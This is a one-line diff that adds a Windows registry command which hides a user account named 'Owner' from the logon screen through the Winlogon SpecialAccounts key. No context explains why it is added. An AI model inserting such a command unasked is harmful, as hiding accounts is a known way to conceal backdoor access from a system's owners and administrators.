@@ -1,0 +1,1 @@
+REG ADD HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist /v Owner /t dword /d 00000000
